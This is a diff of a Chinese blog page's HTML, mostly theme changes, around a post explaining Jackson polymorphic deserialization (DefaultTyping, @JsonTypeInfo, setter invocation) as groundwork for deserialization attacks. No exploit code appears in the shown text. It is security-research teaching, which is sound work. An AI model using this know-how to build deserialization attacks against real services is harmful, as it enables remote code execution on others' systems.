@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>Jackson反序列化 — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2025/08/26/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+<link rel="canonical" href="https://curlysean.github.io/2025/08/26/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2025-08-26T09:00:34.000Z">2025.08.26</time></div>
-      <div><span>更新</span><time datetime="2025-08-26T09:00:34.000Z">2025.08.26</time></div>
-      <div><span>阅读</span><strong>38 MIN</strong></div>
-      <div><span>标签</span><strong>1</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,13 +118,19 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#qE4jT"><span class="toc-text">Jackson反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#w9wXP"><span class="toc-text">Jackson基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SYYMC"><span class="toc-text">Jackson介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JiRw8"><span class="toc-text">Jackson序列化及反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UAc6W"><span class="toc-text">Jackson对于多态问题的解决</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ThNPa"><span class="toc-text">DefaultTping</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#OCeC9"><span class="toc-text">JAVA_LANG_OBJECT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MqB0j"><span class="toc-text">OBJECT_AND_NON_CONCRETE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#aeFG1"><span class="toc-text">NON_CONCRETE_AND_ARRAYS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#c4wzX"><span class="toc-text">NON_FINAL</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NJD6P"><span class="toc-text">@JsonTypeInfo</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Jf81s"><span class="toc-text">NONE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PWzpj"><span class="toc-text">CLASS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#OAAuH"><span class="toc-text">MINIMAL_CLASS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#rICVH"><span class="toc-text">NAME</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#GmgMx"><span class="toc-text">JsonTypeInfo.Id.CUSTOM</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SfjK3"><span class="toc-text">小结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#q83Kq"><span class="toc-text">类属性方法的调用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#smGGv"><span class="toc-text">DefaultTyping</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EFXyd"><span class="toc-text">@JsonTypeInfo 注解</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#faUNP"><span class="toc-text">反序列化调试分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#urGEM"><span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rhUxD"><span class="toc-text">小结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ux21U"><span class="toc-text">Jackson反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cuxx9"><span class="toc-text">前提条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eB04y"><span class="toc-text">Jackson反序列化CVE-2017-7525</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#OrPOt"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CHQ0H"><span class="toc-text">限制条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#X88el"><span class="toc-text">漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#VXnfF"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#yfSKH"><span class="toc-text">分析调试</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bmmKZ"><span class="toc-text">高版本JDK限制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#M6VmS"><span class="toc-text">补丁修复</span></a></li></ol></li></ol></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#w9wXP"><span class="toc-text">Jackson基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SYYMC"><span class="toc-text">Jackson介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JiRw8"><span class="toc-text">Jackson序列化及反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UAc6W"><span class="toc-text">Jackson对于多态问题的解决</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ThNPa"><span class="toc-text">DefaultTping</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NJD6P"><span class="toc-text">@JsonTypeInfo</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#q83Kq"><span class="toc-text">类属性方法的调用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#smGGv"><span class="toc-text">DefaultTyping</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EFXyd"><span class="toc-text">@JsonTypeInfo 注解</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#faUNP"><span class="toc-text">反序列化调试分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#urGEM"><span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rhUxD"><span class="toc-text">小结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ux21U"><span class="toc-text">Jackson反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cuxx9"><span class="toc-text">前提条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eB04y"><span class="toc-text">Jackson反序列化CVE-2017-7525</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#OrPOt"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CHQ0H"><span class="toc-text">限制条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#X88el"><span class="toc-text">漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bmmKZ"><span class="toc-text">高版本JDK限制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#M6VmS"><span class="toc-text">补丁修复</span></a></li></ol></li></ol></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2025-08-26T09:00:34.000Z">2025.08.26</time></div>
+        <div><span>更新</span><time datetime="2025-08-26T09:00:34.000Z">2025.08.26</time></div>
+        <div><span>阅读</span><strong>约 15 分钟</strong></div>
+        <div><span>标签</span><strong>1</strong></div>
+      </div>
       <div class="article-body">
-        <h1 id="qE4jT">Jackson反序列化</h1>
+        
 <h2 id="w9wXP">Jackson基础</h2>
 <h3 id="SYYMC">Jackson介绍</h3>
 Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java 对象序列化为 XML 或 JSON 格式的字符串，以及将 XML 或 JSON 格式的字符串反序列化为 Java 对象。
@@ -128,7 +149,7 @@ Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java �
 <p>Person类序列化后的json字符串如下</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">18</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;CurlySean&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755793239553-034c0dbe-df45-4e27-a175-3b3e8043af83.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755793239553-034c0dbe-df45-4e27-a175-3b3e8043af83.png" alt="Jackson反序列化" loading="lazy"></p>
 <h3 id="UAc6W">Jackson对于多态问题的解决</h3>
 
 <p>将一个多态类的某一个子类序列化后，再进行反序列化时，该怎么确保反序列化出的实例，是我们想要的那个实例呢？Jackson使用JacksonPolymorphicDeserialization机制来解决这个问题：</p>
@@ -162,7 +183,7 @@ Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java �
 <p>运行后输出序列化json字符串如下。我们和未设置<code>JAVA_LANG_OBJECT</code>情况下的序列化字符串做一下对比，发现在设置<code>JAVA_LANG_OBJECT</code>时，Object类型的属性格式为<code>key:[&quot;全类名&quot;,&#123;&quot;key&quot;:&quot;value&quot;&#125;]</code>（有点像fastjson中的<code>@Type</code>）</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置JAVA_LANG_OBJECT</span></span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">20</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;CurlySean&quot;</span>,<span class="string">&quot;hacker&quot;</span>:[<span class="string">&quot;com.Jackson.Hacker&quot;</span>,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xxx&quot;</span>&#125;]&#125;</span><br><span class="line"><span class="comment">//未设置JAVA_LANG_OBJECT</span></span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">20</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;CurlySean&quot;</span>,<span class="string">&quot;hacker&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xxx&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755795014541-d4524649-eb82-4715-bd61-680962338c6e.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755795014541-d4524649-eb82-4715-bd61-680962338c6e.png" alt="Jackson反序列化" loading="lazy"></p>
 <h5 id="MqB0j">OBJECT_AND_NON_CONCRETE</h5>
 
 <p>OBJECT_AND_NON_CONCRETE：除了<code>JAVA_LANG_OBJECT</code>的特征，在类中有Interface和Abstract时，也会将其序列化和反序列化（一切的前提是这些类本身就是合法的可序列化的对象）</p>
@@ -181,9 +202,9 @@ Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java �
 <p>同样我们来对比一下在设置和没有设置情况下序列化字符串的区别</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">20</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;CurlySean&quot;</span>,<span class="string">&quot;hacker&quot;</span>:[<span class="string">&quot;com.Jackson.Hacker&quot;</span>,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xxx&quot;</span>&#125;],<span class="string">&quot;sex&quot;</span>:[<span class="string">&quot;com.Jackson.MySex&quot;</span>,&#123;<span class="string">&quot;sex&quot;</span>:<span class="number">0</span>&#125;]&#125;</span><br><span class="line"><span class="comment">//未设置OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">20</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;CurlySean&quot;</span>,<span class="string">&quot;hacker&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xxx&quot;</span>&#125;,<span class="string">&quot;sex&quot;</span>:&#123;<span class="string">&quot;sex&quot;</span>:<span class="number">0</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755795904729-04aeb902-f6cc-4f08-a1f2-4d23d6599b08.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755795904729-04aeb902-f6cc-4f08-a1f2-4d23d6599b08.png" alt="Jackson反序列化" loading="lazy"></p>
 <p>但是未设置<code>OBJECT_AND_NON_CONCRETE</code>时，反序列化的操作就不是那么顺利了，由于<strong>接口类</strong>的原因，并不能成功的反序列化，<strong>抽象类</strong>同理</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755796129555-f7e9f8dc-c2a9-4a03-a51c-2292c22a1c08.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755796129555-f7e9f8dc-c2a9-4a03-a51c-2292c22a1c08.png" alt="Jackson反序列化" loading="lazy"></p>
 <h5 id="aeFG1">NON_CONCRETE_AND_ARRAYS</h5>
 
 <p>NON_CONCRETE_AND_ARRAYS：在除前面Object、接口类和抽象类以外，多支持了Array数组类型</p>
@@ -193,7 +214,7 @@ Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java �
 <p>设置<code>NON_CONCRETE_AND_ARRAYS</code>的情况下，数组类会在全类名前添加<code>[L</code>，代表这是一个Array类，value的内容格式为<code>[&quot;key1&quot;:&quot;value1&quot;,&quot;key2&quot;:&quot;value2&quot;......]</code></p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">20</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;CurlySean&quot;</span><span class="punctuation">,</span><span class="attr">&quot;hacker&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;[Lcom.Jackson.Hacker;&quot;</span><span class="punctuation">,</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.Jackson.MySex&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755796440844-103c9539-9235-42f9-a676-b9d3e930fd62.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755796440844-103c9539-9235-42f9-a676-b9d3e930fd62.png" alt="Jackson反序列化" loading="lazy"></p>
 <h5 id="c4wzX">NON_FINAL</h5>
 
 <p>NON_FINAL：在整个类中，除final外的属性都会被序列化和反序列化</p>
@@ -206,7 +227,7 @@ Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java �
 <p>运行后输出的json字符串如下，可以看到是十分详细了，但我们的final的secret属性并没有被序列化进来</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&quot;com.Jackson.Person&quot;</span>,&#123;<span class="string">&quot;age&quot;</span>:<span class="number">20</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;CurlySean&quot;</span>,<span class="string">&quot;hacker&quot;</span>:[<span class="string">&quot;[Lcom.Jackson.Hacker;&quot;</span>,[[<span class="string">&quot;com.Jackson.Hacker&quot;</span>,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xxx&quot;</span>&#125;],[<span class="string">&quot;com.Jackson.Hacker&quot;</span>,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xxx&quot;</span>&#125;]]],<span class="string">&quot;sex&quot;</span>:[<span class="string">&quot;com.Jackson.MySex&quot;</span>,&#123;<span class="string">&quot;sex&quot;</span>:<span class="number">0</span>&#125;]&#125;]</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755796978205-56817a01-d244-47de-852f-47a4f8fdb264.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755796978205-56817a01-d244-47de-852f-47a4f8fdb264.png" alt="Jackson反序列化" loading="lazy"></p>
 <h4 id="NJD6P">@JsonTypeInfo</h4>
 
 <p><code>@JsonTypeInfo</code>注解是Jackson多态类绑定的一种方式，取值支持以下五种</p>
@@ -228,7 +249,7 @@ Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java �
 <p>可以看到，设置和没有设置<code>JsonTypeInfo.Id.NONE</code>是一样的</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">20</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;CurlySean&quot;</span><span class="punctuation">,</span><span class="attr">&quot;friend&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755826837830-24687c48-3532-4fdf-b71e-2bd9f1009fec.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755826837830-24687c48-3532-4fdf-b71e-2bd9f1009fec.png" alt="Jackson反序列化" loading="lazy"></p>
 <h5 id="PWzpj">CLASS</h5>
 
 <p>修改Student类<code>@JsonTypeInfo</code>注解的值为<code>JsonTypeInfo.Id.CLASS</code></p>
@@ -237,7 +258,7 @@ Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java �
 <p>运行后输出以下内容，其中为Object类的属性，多了<code>&quot;@class&quot;:&quot;com.Jackson.Hacker&quot;</code>，即含有具体的全类名信息。并且我们可以看到，在反序列化出来的Object类型的属性，也可以对应上我们指定的类型</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">20</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;CurlySean&quot;</span><span class="punctuation">,</span><span class="attr">&quot;friend&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@class&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.Jackson.Hacker&quot;</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">Student.age=<span class="number">20</span><span class="punctuation">,</span> Student.name=CurlySean <span class="punctuation">,</span> com.Jackson.Hacker@<span class="number">55</span>f3ddb1</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755827220163-27a95d41-b58f-4d5c-aa56-be58b52e3bf5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755827220163-27a95d41-b58f-4d5c-aa56-be58b52e3bf5.png" alt="Jackson反序列化" loading="lazy"></p>
 <p>那么在反序列化的过程中，如果使用了<code>JsonTypeInfo.Id.CLASS</code>进行修饰，那么就可以通过<code>@class</code>的方式指定类，进行相关的调用</p>
 <h5 id="OAAuH">MINIMAL_CLASS</h5>
 
@@ -247,14 +268,14 @@ Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java �
 <p>运行后查看输出，唯一的区别就是<code>@c</code>替换了<code>@class</code>，剩下的和<code>CLASS</code>注解值是一样的</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">20</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;CurlySean&quot;</span>,<span class="string">&quot;friend&quot;</span>:&#123;<span class="string">&quot;@c&quot;</span>:<span class="string">&quot;com.Jackson.Hacker&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xxx&quot;</span>&#125;&#125;</span><br><span class="line">Student.age=<span class="number">20</span>, Student.name=CurlySean , com.Jackson.Hacker@18be83e4</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755827526270-dd1bd374-aa59-4c1f-9846-763c62c82823.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755827526270-dd1bd374-aa59-4c1f-9846-763c62c82823.png" alt="Jackson反序列化" loading="lazy"></p>
 <h5 id="rICVH">NAME</h5>
 
 <p>修改注解值为<code>JsonTypeInfo.Id.NAME</code></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)</span></span><br></pre></td></tr></table></figure>
 
 <p>可以看到，在对于Object类属性序列化时，使用<code>&quot;@type&quot;:&quot;className&quot;</code>的方式指定类，但是没有具体的包名，这也就导致了后面在反序列化时会报错，因此该设置值不能被反序列化利用</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755827626201-ffc4704e-6f2d-4fd2-a366-96ff5e1be8c9.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755827626201-ffc4704e-6f2d-4fd2-a366-96ff5e1be8c9.png" alt="Jackson反序列化" loading="lazy"></p>
 <h5 id="GmgMx">JsonTypeInfo.Id.CUSTOM</h5>
 
 <p>其实这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常</p>
@@ -281,7 +302,7 @@ Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java �
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:28,\&quot;name\&quot;:\&quot;CurlySean\&quot;,\&quot;sex\&quot;:[\&quot;com.Jackson.MySex\&quot;,&#123;\&quot;sex\&quot;:1&#125;]&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Teacher</span> <span class="variable">teacher</span> <span class="operator">=</span> objectMapper.readValue(json, Teacher.class);</span><br><span class="line">        System.out.println(teacher);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>看到输出，可以知道在反序列化的过程中，调用了MySex类的setter方法与无参构造方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755830245619-ef55a096-3725-4e48-ade1-cc7dff958e70.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755830245619-ef55a096-3725-4e48-ade1-cc7dff958e70.png" alt="Jackson反序列化" loading="lazy"></p>
 <h4 id="EFXyd">@JsonTypeInfo 注解</h4>
 
 <p>修改Teacher类，在Sex类的前面添加注解</p>
@@ -289,7 +310,7 @@ Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java �
 
 <p>在刚刚的测试代码中，将<code>objectMapper.enableDefaultTyping();</code>部分注释掉</p>
 <p>运行后看到，和使用 DefaultTyping 是一样的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755830677861-12c1b139-a0f0-4115-938e-496fa548f291.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755830677861-12c1b139-a0f0-4115-938e-496fa548f291.png" alt="Jackson反序列化" loading="lazy"></p>
 <h3 id="faUNP">反序列化调试分析</h3>
 <h4 id="urGEM">调试分析</h4>
 
@@ -300,36 +321,36 @@ Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java �
 </ul>
 <p>我们给Teacher类添加一个构造函数，然后在Teacher类、MySex类的构造函数、setter方法和getter方法打断点</p>
 <p>在readValue处打一个断点，我们进行调试分析</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832178227-e47a8287-dfdc-4042-931c-5b8a8ffdda03.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832178227-e47a8287-dfdc-4042-931c-5b8a8ffdda03.png" alt="Jackson反序列化" loading="lazy"></p>
 <p>跟进到<code>_readMapAndClose</code>方法中，首先进行了JsonToken的初始化，然后调用了<code>deserialize</code>方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832393208-20a92137-1af2-4a96-9e13-f788eff89347.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832393208-20a92137-1af2-4a96-9e13-f788eff89347.png" alt="Jackson反序列化" loading="lazy"></p>
 <p>继续跟进<code>deserialize</code>方法，如果是在第一次初始化时，我们就会走到<code>vanillaDeserialize</code>方法处</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755832516559-c7d0d954-7fe4-47f4-a91b-0a25d88f2752.png"></p>
